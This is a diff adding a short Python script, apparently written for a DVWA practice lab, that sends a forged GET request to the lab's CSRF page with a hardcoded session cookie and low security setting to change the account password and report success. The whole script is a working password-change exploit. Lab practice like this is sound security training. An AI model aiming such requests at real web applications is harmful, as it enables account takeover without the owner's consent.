@@ -1,0 +1,40 @@
+import requests
+
+session = requests.Session()
+
+passwd = input("input passwd : ")
+
+base_url = "http://dvwa.jiwon.com/vulnerabilities/csrf/"
+
+params = {
+    "password_new": passwd,
+    "password_conf": passwd,
+    "Change": "Change"
+}
+
+# --------------------------
+# Cookie 적용 (네 환경 기준)
+# --------------------------
+session.cookies.set(
+    "PHPSESSID",
+    "9c45e0d11b4678cc0a6be8079706e798",
+    domain="dvwa.jiwon.com",
+    path="/"
+)
+
+session.cookies.set(
+    "security",
+    "low",
+    domain="dvwa.jiwon.com",
+    path="/"
+)
+
+# --------------------------
+# 요청 전송 (CSRF GET 방식)
+# --------------------------
+attack_response = session.get(base_url, params=params)
+
+if "Password Changed" in attack_response.text:
+    print(f"[+] password change success\npassword : {passwd}")
+else:
+    print("[-] fail")
